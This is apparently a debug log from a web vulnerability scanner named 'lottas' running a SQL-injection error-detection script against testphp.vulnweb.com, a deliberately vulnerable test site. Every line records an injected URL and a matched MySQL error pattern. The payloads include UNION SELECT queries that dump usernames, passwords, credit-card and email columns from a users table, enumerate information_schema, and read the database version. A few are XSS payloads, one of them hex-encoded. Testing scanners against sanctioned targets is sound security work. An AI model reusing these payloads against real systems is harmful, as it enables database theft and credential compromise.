[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+2%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+12--+%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%22%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C%40%40version%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+11+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=4%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28table_name%29+from+information_schema.tables%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%60%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-9999+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Cpass%2C8%2C9%2C10%2C11+FROM+users%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28CHARACTER_SET_NAME%29+from+information_schema%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=123%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28CHARACTER_SET_NAME%2C0x3a%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%24%7Binjection%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:28:59][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cdatabase%28%29+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+1--+%60%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/categories.php/listproducts.php?cat=%27%60%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2Ctable_name%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+from+information_schema.tables+where+table_schema%3Ddatabase%28%29--+%22%29%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+11--+%60%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2Cgroup_concat%28table_name%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+from+information_schema.tables+where+table_schema%3Ddatabase%28%29--+%60%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+2--+%22%29%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1%3D1+UNION+ALL+SELECT+1%2Ctable_name%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+from+information_schema.tables--+-%22%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+5--+%60%29%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+6--+%60%29%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+all+select+1%2Cgroup_concat%28%27user%3A%27%2Cuname%2C%27----pass%3A%27%2Cpass%2C%27-----cc%3A%27%2Ccc%2C%27------email%3A%27%2Cemail%29%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+from+users--+%60%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/categories.php/listproducts.php?cat=3%22%29%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1%3D1+UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+from+information_schema.tables--+-%22%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:01][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/categories.php/listproducts.php?cat=4%22%29%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:02][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+Union+Select+%40k%3A%3D0x3c2f5469746c652f3c2f5363726970742f27223e3c5376672f4f6e4c6f61643d616c6572742831293e%2C%40k%2C%40k%2C%40k%2C%40k%2C%40k%2C%40k%2C%40k%2C%40k%2C%40k%2C%40k%23%22%29%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:02][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+3--+%60%29%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:02][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/categories.php/listproducts.php?cat=2%22%29%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:02][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/categories.php/listproducts.php?cat=1%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:02][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=0.or-1%23%22%29123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:04][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][18:29:04][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=123%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28table_name%29+from+information_schema.tables+where+table_schema%3D%27acuart%27+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+2%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+11+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C%40%40version%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cdatabase%28%29+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2C%40%40version%2C%27vuln3%27%2C%27vuln4%27%2C%27vuln5%27%2C%27vuln6%27%2C%27vuln7%27%2C%27vuln8%27%2C%27vuln9%27%2C%27vuln10%27%2C%27vuln11%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+12%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cdatabase%28%29--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=999999.9%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%24%7Binjection%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:05][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1--dbs%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+12--+%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-9999+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Cpass%2C8%2C9%2C10%2C11+FROM+users%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1*%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28uname%2C0x3a%2Cpass%29+from+acuart.users+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipT%3Econfirm%281%29%3C%2Fscript%3E%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%60%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%5Edatabase%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=3%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%22%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2Cdatabase%28%29%2C%27vul%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2CEVENT_CATALOG+from+information_schema.EVENTS%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=123%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1%3D1+UNION+ALL+SELECT+1%2C2%2C3%2C4+from+information_schema.tables--+-%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=4%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%E2%80%9D%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%3E%3Cscript%3Ealert%28%22Anmol%22%29%3C%2Fscript%3E%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28column_name%29+from+information_schema%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28CHARACTER_SET_NAME%29+from+information_schema%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28CHARACTER_SET_NAME%2C0x3a%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:06][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2Cgroup_concat%28colu%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:07][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28table_name%29+from+information_schema.tables%27123", "SQL syntax.*?MySQL"))
[2022-08-31][18:29:07][lottas::core][DEBUG] SCRIPT RESULTS : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Ctable_name+from+information_schema.tables%27123", "SQL syntax.*?MySQL"))
